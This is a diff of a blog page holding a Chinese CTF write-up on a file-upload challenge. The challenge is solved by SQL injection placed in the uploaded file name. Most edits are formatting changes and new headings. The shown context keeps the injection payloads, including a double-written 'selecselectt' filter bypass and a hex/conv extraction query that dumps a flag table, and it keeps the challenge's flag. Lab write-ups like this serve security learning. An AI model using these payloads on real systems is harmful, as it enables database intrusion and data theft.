@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">696</span>Reading time: <span class="post-count reading-time">2 min</span></span>
+                        <span>Word count: <span class="post-count word-count">699</span>Reading time: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -405,10 +405,10 @@ height:50vh;
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>burpsuite抓包改后缀名为php得到结果回应为文件格式错误，应该是服务器端的检查，而非客户端Js过滤；</p>
-<p>#分析：<br><strong>题目限制了上传文件的后缀名必须为jpg，但并没有对文件内容有所检查；</strong><br><strong>图片马的方法不可行，上传成功后并没有目录，同时无法上传.htaccess对图片马解析；</strong><br>参阅相关资料发现似乎是利用文件名注入，并且通过每次上传成功后的回显uid is ：1660 大概能够猜测应该是利用文件名对后端数据库进行注入；<br>*后端插入语句：</p>
+<h1 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h1><p><strong>题目限制了上传文件的后缀名必须为jpg，但并没有对文件内容有所检查；</strong><br><strong>图片马的方法不可行，上传成功后并没有目录，同时无法上传.htaccess对图片马解析；</strong><br>参阅相关资料发现似乎是利用文件名注入，并且通过每次上传成功后的回显uid is ：1660 大概能够猜测应该是利用文件名对后端数据库进行注入；<br>*后端插入语句：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名</span><br><span class="line"><span class="keyword">VALUES</span>（被插入新行中的值）</span><br></pre></td></tr></table></figure>
 
-<p>构造payload：（文件名）</p>
+<h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>构造payload：（文件名）</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(<span class="keyword">select</span> <span class="keyword">database</span>())+<span class="string">'.jpg</span></span><br></pre></td></tr></table></figure>
 
 <p>可以看到select被过滤了，尝试双写绕过：</p>
@@ -442,8 +442,8 @@ height:50vh;
 <p>115858377367398<br>7102823<br>得到字段名：i_am_flag<br>爆值<br>payload：</p>
 <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(selecselectt conv(substr(hex((selecselectt i_am_flag frofromm hello_flag_is_here limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>,<span class="number">12</span>),<span class="number">16</span>,<span class="number">10</span>))+'.jpg</span><br></pre></td></tr></table></figure>
 
-<p>36427215695199<br>92806431727430<br>560750951<br>得到值：!!<a href="mailto:_@m_Th.e_F" target="_blank" rel="noopener">_@m_Th.e_F</a>!lag</p>
-
+<p>36427215695199<br>92806431727430<br>560750951<br>得到值：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!!_@<span class="keyword">m_Th</span>.<span class="keyword">e_F</span>!<span class="keyword">lag</span></span><br></pre></td></tr></table></figure>
     </article>
     <!-- license  -->
     
@@ -451,7 +451,7 @@ height:50vh;
             <p>Author：<a href="https://singlemindedt.github.io">Smtsec</a>
             <p>原文链接：<a href="https://singlemindedt.github.io/2019/12/16/upload/">https://singlemindedt.github.io/2019/12/16/upload/</a>
             <p>发表日期：<a href="https://singlemindedt.github.io/2019/12/16/upload/">December 16th 2019, 8:14:47 am</a>
-            <p>更新日期：<a href="https://singlemindedt.github.io/2019/12/16/upload/">December 16th 2019, 7:36:18 pm</a>
+            <p>更新日期：<a href="https://singlemindedt.github.io/2019/12/16/upload/">December 16th 2019, 7:45:02 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -587,7 +587,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#初探"><span class="toc-number">1.</span> <span class="toc-text">初探</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#初探"><span class="toc-number">1.</span> <span class="toc-text">初探</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析："><span class="toc-number">2.</span> <span class="toc-text">分析：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#操作"><span class="toc-number">3.</span> <span class="toc-text">操作</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
